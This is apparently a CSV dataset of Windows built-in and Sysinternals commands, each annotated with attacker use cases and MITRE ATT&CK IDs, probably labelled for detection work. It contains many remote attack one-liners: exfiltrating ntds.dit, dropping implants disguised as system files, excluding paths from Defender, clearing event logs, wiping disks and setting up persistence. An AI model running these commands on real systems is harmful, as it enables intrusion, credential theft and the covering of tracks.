"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"Export-VM","Exports a virtual machine to disk","2023-07-01","[''Builtin''-|-''CIMSession'']","","Export-VM -Name 'Windows 10 22H2' -Path C:\tmp -CimSession $s","Export VM","Export a (running) VM and copy its data over the network","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Can also be a running VM''-|-''Next, using [Copy-Item](../Copy-Item) the exported VM can be copied''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Enter-PSSession","Starts an interactive session with a remote computer","2023-08-25","[''Builtin''-|-''PSSession'']","","[''Enter-PSSession -Session $ps''-|-''Enter-PSSession -ComputerName W10.ad.bitsadmin.com'']","[''Start interactive session''-|-''Start interactive session'']","[''Launch shell and perform reconnaissance or install a backdoor''-|-''Launch shell and perform reconnaissance or install a backdoor'']","[''Execute''-|-''Execute'']","[''Create `$ps` using [New-PSSession](../New-PSSession)''-|-''None'']","[''T1021.006''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Enable-NetFirewallRule","Enables a previously disabled firewall rule","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Enable-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Enable-ADAccount","Enables an Active Directory account","2023-07-01","RSAT","","Enable-ADAccount","Enable account","(Re-)enable account to make use of it","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Dismount-DiskImage","Dismounts a disk image (virtual hard disk or ISO) so that it can no longer be accessed as a disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Dismount-DiskImage -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Disable-NetFirewallRule","Disables a firewall rule","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Disable-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Disable-NetAdapter","Disables a network adapter","2023-07-01","[''Builtin''-|-''CIMSession'']","","Disable-NetAdapter -Name Ethernet0 -CimSession $s","Disable network adapter","Put remote machine offline","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetAdapter`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Disable-ADAccount","Disables an Active Directory account","2023-07-01","RSAT","","Disable-ADAccount -Identity Hacker","Disable account","None","Domain","PowerShell Module: `ActiveDirectory`","T1531","None","None","","Arris Huijgen","bitsadmin","","false"
"Copy-VMFile","Copies a file to a virtual machine","2023-07-01","[''Builtin''-|-''CIMSession'']","","Copy-VMFile -SourcePath C:\tmp\malware.exe -Name 'Windows 10 22H2' -DestinationPath C:\Windows\System32\spoolsv64.exe -FileSource Host -CimSession $s","Copy file to VM","Copy implant to VM","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''`C:\tmp\malware.exe` is a file path on the Hyper-V host to which the `-CimSession $s` points''-|-''`malware.exe` can be copied to the Hyper-V host using [Copy-Item](../Copy-Item)''-|-''Depends on some guest integration services to be enabled for the VM''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Copy-Item","Copies an item from one location to another","2023-08-25","[''Builtin''-|-''PSSession'']","","[''Copy-Item -Path C:\boot.ini -Destination . -FromSession $ps''-|-''Copy-Item -Path C:\beacon.exe -Destination C:\Windows\System32\Explorer.exe -ToSession $ps''-|-''Copy-Item -Path \\DC01.ad.bitsadmin.com\C$\@GMT-2023.06.01-19.34.01\Windows\NTDS\ntds.dit -Destination C:\Tmp\'']","[''Copy file from PSSession''-|-''Copy file to PSSession''-|-''Copy from volume shadow copy'']","[''Exfiltrate data''-|-''Copy implant''-|-''Exfiltrate `ntds.dit` from shadow copy over SMB'']","[''Data''-|-''Data''-|-''Data'']","[''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Management`''-|-''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Management`''-|-''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''Example of performing such copy at the blog in the references''-|-''PowerShell Module: `Microsoft.PowerShell.Management`'']","[''T1021.006''-|-''T1021.006''-|-''T1570''-|-''T1570''-|-''T1021.002'']","https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system","None","","Arris Huijgen","bitsadmin","","false"
"Connect-WSMan","Connects to the WinRM service on a remote computer","2023-07-01","[''Builtin''-|-''TODO'']","","Connect-WSMan","TODO","None","Manage","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Close-SmbSession","Ends forcibly the SMB session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Close-SmbSession -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Close-SmbOpenFile","Closes a file that is open by one of the clients of the SMB server","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Close-SmbOpenFile -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Clear-Eventlog","Clears all entries from specified event logs on the local or remote computers.","2024-12-13","Builtin","","Clear-EventLog -LogName Application,Security,System -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com","Clear various logs on various computers","Cover tracks clearing past events in the various logs","Logs","[''Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)''-|-''See also [wevtutil.exe](../../Binaries/wevtutil)'']","T1070.001","None","None","","Arris Huijgen","bitsadmin","","false"
"Clear-DnsClientCache","Clears the contents of the DNS client cache","2023-07-01","[''Builtin''-|-''CIMSession'']","","Clear-DnsClientCache -CimSession $s","Clear DNS cache","Clear the DNS cache from any DNS entries that the attacker might have (accidentally) placed there","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Clear-Disk","Cleans a disk by removing all partition information and un-initializing it, erasing all data on the disk","2023-07-01","[''Builtin''-|-''CIMSession'']","","Clear-Disk -CimSession $s -Number 3","Clear disk with id 3","Affect availability of data on a disk","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","[''T1561''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Backup-GPO","Backs up one GPO or all the GPOs in a domain","2023-07-01","[''RSAT''-|-''TODO'']","","Backup-Gpo -Domain ad.bitsadmin.com -All -Path C:\tmp\GPOBackups","Backup all GPOs of the domain","Collect GPOs and search for credentials","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-NetNatStaticMapping","Adds a static mapping to a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Add-NetNatStaticMapping -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-NetNatExternalAddress","Adds an external address to a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Add-NetNatExternalAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-NetEventPacketCaptureProvider","Adds a Remote Packet Capture provider","2023-11-04","[''Builtin''-|-''CIMSession'']","","Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical -TruncationLength ([UInt16]::MaxValue)","Add packet capture provider to eventsession","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''Can be opened using for example NetworkMiner or Wireshark''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-MpPreference","Modifies settings for Windows Defender","2023-07-01","[''Builtin''-|-''CIMSession'']","","Add-MpPreference -ExclusionPath 'C:\EvilTools' -CimSession $s","Exclude path from AV","Exclude path from AV so malicious tools can be stored there","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-EtwTraceProvider","Adds an ETW trace provider to an ETW Autologger configuration or ETW session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Add-EtwTraceProvider -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-DnsClientNrptRule","Adds a rule to the NRPT","2023-07-01","[''CIMSession''-|-''TODO'']","","Add-DnsClientNrptRule -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-ADGroupMember","Adds one or more members to an Active Directory group","2023-07-01","RSAT","","Add-ADGroupMember 'Domain Admins' -Members Hacker","Add user to domain group","Add a user to a certain domain group to obtain certain privileges","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"wmic.exe","Command-line interface for Windows Management Instrumentation (WMI)","2023-07-01","Builtin","","[''wmic.exe /node:W10.ad.bitsadmin.com process call create ""beacon.exe""''-|-''wmic.exe /node:W10.ad.bitsadmin.com /output:processes.csv process list /format:CSV'']","[''Launch process''-|-''Query processes'']","[''Launch implant''-|-''Reconnaissance on running processes'']","[''Execute''-|-''Processes'']","[''None''-|-''None'']","[''T1047''-|-''T1057''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"winrs.exe","Manage and execute programs remotely","2023-07-01","Builtin","","[''winrs.exe -r:W10.ad.bitsadmin.com ipconfig /all''-|-''winrs.exe -r:W10.ad.bitsadmin.com cmd'']","[''Execute WinRM command''-|-''Launch interactive shell'']","[''Perform reconnaissance or launch implant''-|-''None'']","[''Execute''-|-''Execute'']","[''None''-|-''None'']","[''T1021.006''-|-''T1059.001''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"wevtutil.exe","Windows Events Command Line Utility","2024-12-14","Builtin","","wevtutil /remote:CAROOT1.ad.bitsadmin.com cl Security","Clear security event log","Cover tracks clearing past events","Recon","See also [Clear-EventLog](../../Cmdlets/Clear-Eventlog)","T1070.001","None","None","","Arris Huijgen","bitsadmin","","false"
"waitfor.exe","Sends or waits for a signal on a system","2023-07-01","[''Builtin''-|-''TODO'']","","waitfor.exe","TODO","None","Misc","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"w32tm.exe","Synchronize the date and time","2023-07-01","Builtin","","w32tm.exe /query /computer:W10.ad.bitsadmin.com /status /verbose","Show time details","None","Recon","None","T1124","None","None","","Arris Huijgen","bitsadmin","","false"
"volrest.exe","Previous Version command-line tool","2023-08-25","Extra","","volrest.exe \\W10.ad.bitsadmin.com\C$\Windows\System32\Config","List snapshots of network share","List snapshots of the config directory and then copy the `SAM`/`SECURITY`/`SYSTEM` files from that snapshot","Data","[''Also known as volume shadow copies''-|-''Part of the Windows Server 2003 Resource Kit'']","[''T1083''-|-''T1003.002'']","https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system","None","","Arris Huijgen","bitsadmin","","false"
"uptime.exe","Display uptime of a system","2023-07-01","Extra","","uptime.exe W10.ad.bitsadmin.com","Show uptime","Identify if a machine could be relevant for longer term persistence without having to install persistence","Recon","None","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"typeperf.exe","Writes performance data to the command window or to a log file","2023-07-01","[''Builtin''-|-''TODO'']","","typeperf.exe ""\\W10.ad.bitsadmin.com\Processor(0)\% User Time""","TODO","None","Logs","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"tskill.exe","Ends a process","2023-07-01","Builtin","","tskill.exe cmd /Server:W10.ad.bitsadmin.com /A /V","Kill a process","Terminate a process","Processes","None","T1562.001","None","None","","Arris Huijgen","bitsadmin","","false"
"tsdiscon.exe","Disconnects a session from a Remote Desktop Session Host (RD Session Host) server","2023-07-01","Builtin","","tsdiscon.exe rdp-tcp#1 /server:W10.ad.bitsadmin.com","Disconnect a user","None","Sessions","None","T1531","None","None","","Arris Huijgen","bitsadmin","","false"
"tasklist.exe","Displays a list of currently running processes","2023-07-01","Builtin","","tasklist.exe /S W10.ad.bitsadmin.com /FO CSV > W10_tasklist.csv","List processes","Perform reconnaissance on executing processes","Processes","None","T1057","None","None","","Arris Huijgen","bitsadmin","","false"
"taskkill.exe","Terminate tasks by process id (PID) or image name","2023-07-01","Builtin","","taskkill.exe /S W10.ad.bitsadmin.com /F /IM cmd.exe","Kill a process","Terminate a process","Processes","None","T1562.001","None","None","","Arris Huijgen","bitsadmin","","false"
"takeown.exe","Allows an administrator to recover access to a file that was denied by re-assigning file ownership","2023-07-01","[''Builtin''-|-''TODO'']","","takeown.exe /S system /F MyShare\Acme*.doc","Take ownership over a file","Alter permissions","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"systeminfo.exe","Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties","2023-08-25","Builtin","","systeminfo.exe /S W10.ad.bitsadmin.com","Show system information","List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities","Recon","None","T1082","https://blog.bitsadmin.com/windows-security-updates-for-hackers","None","","Arris Huijgen","bitsadmin","","false"
"ssh.exe","Secure Shell client","2024-12-13","Builtin","","ssh.exe -Kv myuser@linux.ad.bitsadmin.com","Connect to SSH server using Kerberos","Lateral movement","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"srvinfo.exe","Gather information about a target server","2023-07-01","Extra","","srvinfo.exe \\DC1.ad.bitsadmin.com","List computer information","List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities","Recon","[''Similar to [systeminfo.exe](../systeminfo)''-|-''Part of the Windows Server 2003 Resource Kit'']","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"srvcheck.exe","Server share check","2023-07-01","Extra","","srvcheck.exe \\DC1.ad.bitsadmin.com","Displays a list of server shares and who has access","None","Data","Part of the Windows Server 2003 Resource Kit","T1135","None","None","","Arris Huijgen","bitsadmin","","false"
"sqlcmd.exe","Integrated environment for managing any SQL infrastructure, from SQL Server to Azure SQL Database","2023-07-01","Extra","","sqlcmd.exe -S SQL1.ad.bitsadmin.com\SQLEXPRESS","SQL Server Command Line Tool","Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links","Manage","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"shutdown.exe","Shut down or restart local or remote computers, one at a time","2023-07-01","Builtin","","shutdown.exe /r /f /t 0 /m \\W10.ad.bitsadmin.com","Restart machine","Affect availability of a computer","Sessions","None","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"shrpubw.exe","Create a Shared Folder Wizard","2024-12-13","[''Builtin''-|-''GUI'']","","shrpubw /s W10.ad.bitsadmin.com","Create a Shared Folder Wizard","Add (hidden - dollar share) shared folder","Manage","Alternatively, use [fsmgmt.msc](../../MMC/fsmgmt)","[''T1135''-|-''T1021.002'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"shadow.exe","Remotely control an active session of another user on a Remote Desktop Session Host server","2023-08-25","Builtin","","shadow.exe 3 /SERVER:W10.ad.bitsadmin.com","RDP shadow a user session","None","Sessions","Starting from Windows 8/Server 2012 this binary is replaced with `mstsc.exe`","T1563.002","https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing","None","","Arris Huijgen","bitsadmin","","false"
"setx.exe","Modifies the value of a service's entries in the registry and in the Service Control Manager database","2023-07-01","Builtin","","setx.exe /S W10.ad.bitsadmin.com /M MYVAR ""Hello there!""","Set machine-wide environment variables","Configure a path order hijack","Registry","None","T1112","None","None","","Arris Huijgen","bitsadmin","","false"
"setspn.exe","Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account","2023-07-01","Builtin","","[''setspn.exe -L ad.bitsadmin.com\SP2019''-|-''setspn.exe -T ad.bitsadmin.com -Q */*''-|-''setspn.exe -S HTTP/EXCH2019.ad.bitsadmin.com EXCH2019'']","[''List SPNs for a specific account''-|-''List all SPNs in the domain''-|-''Set SPN'']","[''Reconnaissance''-|-''Reconnaissance''-|-''Add an SPN to a user for a targeted Kerberoast'']","[''Domain''-|-''Domain''-|-''Domain'']","[''Can be both a regular account as well as a computer account''-|-''None''-|-''Error when execution from Offensive Windows VM: `Ldap Error(0x51 -- Server Down): ldap_connect; Failed to retrieve DN for domain """" : 0x00000051; Warning: No valid targets specified, reverting to current domain.; FindDomainForAccount: Call to DsGetDcNameWithAccountW failed with return value 0x0000054B; Unable to locate account SP2019`'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"sdelete.exe","Secure file delete","2023-07-01","Sysinternals","","sdelete \\W10.ad.bitsadmin.com\C$\backdoor.exe","Securely delete a file","Cleanup of traces","Data","None","T1070.004","None","None","","Arris Huijgen","bitsadmin","","false"
"scp.exe","Secure Copy","2024-12-13","Builtin","","scp.exe -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes myuser@linux.ad.bitsadmin.com:/tmp/file.tgz file.tgz","Copy file locally from SSH server authenticating using Kerberos","[''Data collection''-|-''Tool transfer'']","Data","None","T1105","None","None","","Arris Huijgen","bitsadmin","","false"
"schtasks.exe","Create, delete, query, change, run and end scheduled tasks","2023-11-04","Builtin","","[''schtasks.exe /S W10.ad.bitsadmin.com /Create /RU SYSTEM /SC HOURLY /TN ""Microsoft\Windows\Printing\Print Spooler (x64)"" /TR ""C:\Windows\System32\spoolsv64.exe""''-|-''schtasks.exe /S W10.ad.bitsadmin.com'']","[''Create new task''-|-''List tasks'']","[''Command execution through scheduled task''-|-''Persistence by registering a scheduled task''-|-''List current tasks to identify a name that can be used for a new task to blend in'']","[''Execute''-|-''Recon'']","[''None''-|-''None'']","[''T1053.005''-|-''T1053.005'']","None","None","","Arris Huijgen","bitsadmin","","false"
"sc.exe","Interact with the Service Control Manager database","2023-07-01","Builtin","","[''sc.exe \\W10.ad.bitsadmin.com create MyService binpath= C:\Windows\implant.exe''-|-''sc.exe \\W10.ad.bitsadmin.com config wuauserv start= disabled''-|-''sc.exe \\W10.ad.bitsadmin.com query''-|-''sc.exe \\W10.ad.bitsadmin.com start MyService''-|-''sc.exe \\W10.ad.bitsadmin.com stop wuauserv'']","[''Create service''-|-''Disable service''-|-''List services''-|-''Start service''-|-''Stop service'']","[''Create service pointing to implant binary''-|-''Impair security defenses''-|-''Reconnaissance of installed services''-|-''Launch implant''-|-''Impair security defenses'']","[''Execute''-|-''Execute''-|-''Recon''-|-''Execute''-|-''Execute'']","[''None''-|-''None''-|-''None''-|-''None''-|-''None'']","[''T1569.002''-|-''T1543.003''-|-''T1489''-|-''TA0043''-|-''T1569.002''-|-''T1489'']","None","None","","Arris Huijgen","bitsadmin","","false"
"rwinsta.exe","Reset the session subsytem hardware and software to known initial values","2023-07-01","Builtin","","rwinsta.exe 1 /SERVER:W10.ad.bitsadmin.com /V","TODO","None","Sessions","[''Sessions can be queried using [qwinsta.exe](../qwinsta)''-|-''Equivalent to [reset.exe](../reset)'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"rpcdump.exe","RPC endpoint diagnostic utility","2023-07-01","Extra","","rpcdump.exe /S W10.ad.bitsadmin.com /V /I > W10.txt","List RPC endpoints","Identify whether certain services or software is running based on the available RPC interfaces","Recon","Part of the Windows Server 2003 Resource Kit","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"reset.exe","Reset the session subsytem hardware and software to known initial values","2023-07-01","Builtin","","reset.exe session 1 /SERVER:W10.ad.bitsadmin.com /V","Logoff user","None","Sessions","[''Sessions can be queried using [qwinsta.exe](../qwinsta)''-|-''Equivalent to [rwinsta.exe](../rwinsta)'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"repadmin.exe","Diagnose Active Directory replication problems between domain controllers","2023-07-01","Builtin","","repadmin.exe /replsummary /homeserver:DC1.ad.bitsadmin.com","Show replication state","None","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"rendom.exe","Performs various actions necessary for a domain rename operation","2023-07-01","[''Builtin''-|-''TODO'']","","rendom.exe","TODO","None","Domain","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"regini.exe","Modifies the registry from the command line or a script","2023-07-01","[''Builtin''-|-''TODO'']","","regini.exe -m \\W10.ad.bitsadmin.com mybackdoor.ini","Import ini into registry of remote system","Add registry persistence","Registry","None","T1112","None","None","","Arris Huijgen","bitsadmin","","false"
"regedit.exe","Registry Editor","2023-07-01","[''Builtin''-|-''GUI'']","","regedit.exe","Registry Editor","[''Read secrets from the registry''-|-''Add persistence'']","Registry","File -> Connect Network Registry","[''T1012''-|-''T1112'']","None","None","","Arris Huijgen","bitsadmin","","false"
"reg.exe","Query and edit the registry","2023-07-01","Builtin","","[''reg.exe query ""\\W10.ad.bitsadmin.com\HKLM\Software\Microsoft\Windows\CurrentVersion\Run""''-|-''reg.exe add \\W10.ad.bitsadmin.com\HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD'']","[''Query registry key''-|-''Set registry value'']","[''Query registry autoruns''-|-''Configure the remote system, e.g. to support Kerberos authentication for remote desktop''-|-''Configure the automatic start of an implant upon boot'']","[''Registry''-|-''Registry'']","[''None''-|-''None'']","[''T1012''-|-''T1547.001''-|-''T1112'']","None","None","","Arris Huijgen","bitsadmin","","false"
"qwinsta.exe","Display information about Remote Desktop Services sessions","2024-12-13","Builtin","","qwinsta.exe /server:W10.ad.bitsadmin.com","List listeners and interactive sessions","Check whether the system has high-privileged users logged in to then laterally move to it","Sessions","Equivalent to [query.exe](../query) session","None","None","None","","Arris Huijgen","bitsadmin","","false"
"quser.exe","Displays information about user sessions on a Remote Desktop Session Host server","2024-12-13","Builtin","","quser.exe /server:W10.ad.bitsadmin.com","List logged in users","Check whether the system has high-privileged users logged in to then laterally move to it","Sessions","Equivalent to [query.exe](../query) user","None","None","None","","Arris Huijgen","bitsadmin","","false"
"query.exe","Displays information about processes, sessions, and Remote Desktop Session Host servers","2024-12-13","Builtin","","[''query.exe session /server:W10.ad.bitsadmin.com''-|-''query.exe user /server:W10.ad.bitsadmin.com''-|-''query.exe process /server:W10.ad.bitsadmin.com *''-|-''query.exe process /server:W10.ad.bitsadmin.com keepass.exe''-|-''query.exe termserver'']","[''List listeners and interactive sessions''-|-''List logged in users''-|-''List all processes''-|-''List all processes''-|-''List terminal servers on the network'']","[''Reconnaissance on currently active sessions''-|-''Reconnaissance on currently active users''-|-''Reconnaissance on running processes''-|-''Identify specific running process''-|-''None'']","[''Sessions''-|-''Sessions''-|-''Processes''-|-''Processes''-|-''Sessions'']","[''Equivalent to [qwinsta.exe](../qwinsta)''-|-''Equivalent to [quser.exe](../quser)''-|-''Equivalent to [qprocess.exe](../qprocess)''-|-''Equivalent to [qprocess.exe](../qprocess)''-|-''Equivalent to [qappsrv.exe](../qappsrv)'']","[''None''-|-''None''-|-''T1057''-|-''T1057''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"qprocess.exe","Displays information about processes that are running on a Remote Desktop Session Host server","2024-12-13","Builtin","","[''qprocess.exe /server:W10.ad.bitsadmin.com DomainUser2''-|-''qprocess.exe /server:W10.ad.bitsadmin.com *'']","[''List all processes''-|-''List all processes'']","[''Reconnaissance on running processes for a specific user''-|-''Reconnaissance on running processes'']","[''Processes''-|-''Processes'']","[''None''-|-''Equivalent to [query.exe](../query) process'']","[''T1057''-|-''T1057'']","None","None","","Arris Huijgen","bitsadmin","","false"
"qappsrv.exe","Displays the available Remote Desktop Session Host servers on the network","2024-12-13","Builtin","","qappsrv dc1.ad.bitsadmin.com","Display information about Remote Desktop Session Host server","None","Manage","Equivalent to [query.exe](../query) termserver","None","None","None","","Arris Huijgen","bitsadmin","","false"
"pssuspend.exe","Suspends or resumes processes on a local or remote system","2023-07-01","Sysinternals","","[''pssuspend.exe -r \\W10.ad.bitsadmin.com procexp.exe''-|-''pssuspend.exe \\W10.ad.bitsadmin.com procexp.exe'']","[''Resume process''-|-''Suspend process'']","[''None''-|-''Alternative to terminating a process'']","[''Processes''-|-''Processes'']","[''Installs PsSuspend service''-|-''Installs PsSuspend service'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"psshutdown.exe","Shutdown, logoff and power manage local and remote systems","2023-07-01","Sysinternals","","psshutdown.exe -f -k \\W10.ad.bitsadmin.com","Shutdown computer","Affect availability of a computer","Sessions","Makes use of a service that is installed on the remote system. Better make use of [shutdown.exe](../shutdown)","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"psservice.exe","Lists or controls services on a local or remote system","2023-07-01","Sysinternals","","psservice.exe \\W10.ad.bitsadmin.com config","List services","Reconnaissance of installed services","Processes","None","T1569.002","None","None","","Arris Huijgen","bitsadmin","","false"
"psping.exe","Implements Ping functionality, TCP ping, UDP/TCP latency, and UDP / TCP bandwidth measurement","2023-07-01","[''Sysinternals''-|-''TODO'']","","psping.exe","TODO","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"pspasswd.exe","Changes passwords on a local or remote system","2023-07-01","Sysinternals","","pspasswd.exe \\W10.ad.bitsadmin.com MyUser MyNewPassword","Update password","Update a user's password","Sessions","None","T1531","None","None","","Arris Huijgen","bitsadmin","","false"
"psloglist.exe","Dumps event logs on a local or remote system","2023-07-01","Sysinternals","","[''psloglist.exe -nobanner -i 99999 -c \\W10.ad.bitsadmin.com Security''-|-''psloglist.exe -nobanner -s \\W10.ad.bitsadmin.com Security'']","[''Clear Security event log''-|-''List events in the Security event log'']","[''Cover tracks clearing past logon events''-|-''Identify which IPs logons of privileged users are originating from'']","[''Logs''-|-''Logs'']","[''Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)''-|-''None'']","[''T1070.001''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
